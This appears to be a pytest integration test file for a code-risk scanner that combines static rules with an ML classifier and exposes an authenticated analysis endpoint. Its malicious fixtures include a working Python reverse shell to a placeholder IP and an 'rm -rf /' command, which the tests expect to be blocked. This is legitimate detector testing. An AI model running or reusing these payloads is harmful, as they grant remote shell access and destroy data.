"""
tests/test_risk_ml_integration.py — Integration tests for the trained ML model and risk gate.

Verifies:
1. Real ML model artifact loading from py_risk.joblib
2. Prediction and feature extraction on benign and malicious Python code
3. Multi-language handling (Python gets rules+ml; other languages stay rules-only)
4. Score escalation policy (ML raises score; rules are never overruled)
5. Service gate assess_and_record() behavior
6. REST API endpoint POST /risk/analyze with authenticated user
"""

import pytest
from httpx import ASGITransport, AsyncClient

from backend.risk.analyzer import RiskContext, assess_and_record, warm_up
from backend.risk.engine import load_model, score_code
from backend.risk.scorer import Thresholds

# ---------------------------------------------------------------------------
# 1. Real ML Model Artifact Tests
# ---------------------------------------------------------------------------


def test_real_ml_model_loads_successfully():
    """Verify the real py_risk.joblib artifact exists, matches version, and loads."""
    bundle = load_model(force=True)
    assert bundle is not None, "Failed to load real py_risk.joblib model bundle"
    assert "pipeline" in bundle
    assert "feature_idx" in bundle
    assert "t_flag" in bundle
    assert bundle.get("features_version") == 1
    assert len(bundle["feature_idx"]) > 0


def test_real_ml_model_prediction_on_benign_python():
    """Benign code should be classified as low risk by the ML model."""
    benign_code = """
def quicksort(arr):
    if len(arr) <= 1:
        return arr
    pivot = arr[len(arr) // 2]
    left = [x for x in arr if x < pivot]
    middle = [x for x in arr if x == pivot]
    right = [x for x in arr if x > pivot]
    return quicksort(left) + middle + quicksort(right)

print(quicksort([3, 6, 8, 10, 1, 2, 1]))
"""
    result = score_code(benign_code, "python")
    assert result.model == "rules+ml"
    assert result.fallback_reason is None
    assert result.ml_score is not None
    # Benign Fibonacci / sorting should receive low risk
    assert result.score < 40
    assert result.decision == "allow"


def test_real_ml_model_prediction_on_malicious_python():
    """Known reverse shell payload is blocked with maximum score."""
    malicious_code = """
import socket, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("198.51.100.23", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/sh")
"""
    result = score_code(malicious_code, "python")
    assert result.model == "rules+ml"
    assert result.decision == "block"
    assert result.score >= 80
    assert result.ml_score is not None
    assert result.ml_score >= 80


def test_ml_detection_adds_ml_classifier_finding():
    """When ML score exceeds rules score and meets threshold, an ml.python_classifier finding is attached."""
    code = """
import urllib.request
try:
    urllib.request.urlopen("https://example.com", timeout=5)
    print("CONNECTED")
except Exception as e:
    print("blocked:", type(e).__name__)
"""
    result = score_code(code, "python")
    assert result.model == "rules+ml"
    assert result.ml_score is not None
    assert result.ml_score > result.rules_score
    ml_findings = [f for f in result.findings if f.rule_id == "ml.python_classifier"]
    assert len(ml_findings) == 1
    assert ml_findings[0].category == "ml"
    assert ml_findings[0].weight >= 0.70


def test_non_python_languages_remain_rules_only():
    """Non-Python languages (e.g. Go, JS) fall back to rules-only mode."""
    go_code = """
package main
import "fmt"
func main() {
    fmt.Println("Hello, Go!")
}
"""
    result = score_code(go_code, "go")
    assert result.model == "rules"
    assert result.fallback_reason == "ml_python_only"
    assert result.ml_score is None


def test_ml_escalates_score_when_rules_underestimate():
    """Demonstrates ML high-water mark: final_score = max(rules, ml)."""
    # Code with mild obfuscation / dynamic imports that triggers few static rules
    code = """
import importlib
mod = importlib.import_module("os")
getattr(mod, "system")("id")
"""
    result = score_code(code, "python")
    assert result.model == "rules+ml"
    assert result.ml_score is not None
    assert result.score >= result.rules_score


# ---------------------------------------------------------------------------
# 2. Service Gate: assess_and_record()
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_assess_and_record_allows_safe_code():
    safe_code = "print('Hello, world!')\n"
    decision = await assess_and_record(safe_code, "python")
    assert not decision.blocked
    assert decision.decision == "allow"
    assert decision.score < 40
    assert decision.error is None


@pytest.mark.asyncio
async def test_assess_and_record_blocks_destructive_code():
    bad_code = "import os\nos.system('rm -rf /')\n"
    decision = await assess_and_record(bad_code, "python")
    assert decision.blocked
    assert decision.decision == "block"
    assert decision.score >= 80


@pytest.mark.asyncio
async def test_warm_up_initializes_model():
    info = warm_up()
    assert info["model_loaded"] is True
    assert info["fallback_reason"] is None


# ---------------------------------------------------------------------------
# 3. HTTP API: POST /risk/analyze Endpoint
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_risk_analyze_endpoint_requires_auth():
    from backend.app.main import app

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.post(
            "/risk/analyze",
            json={"language": "python", "code": "print('hello')"},
        )
        assert resp.status_code == 401


@pytest.mark.asyncio
async def test_risk_analyze_endpoint_success_with_token():
    from backend.app.auth import create_access_token
    from backend.app.main import app

    token = create_access_token("test-user-id", "Test User")
    headers = {"Authorization": f"Bearer {token}"}

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.post(
            "/risk/analyze",
            headers=headers,
            json={
                "language": "python",
                "code": "import socket\ns = socket.socket()\n",
            },
        )
        assert resp.status_code == 200
        data = resp.json()
        assert "decision" in data
        assert "score" in data
        assert "thresholds" in data
        assert "findings" in data
        assert data["model"] == "rules+ml"
        assert isinstance(data["findings"], list)
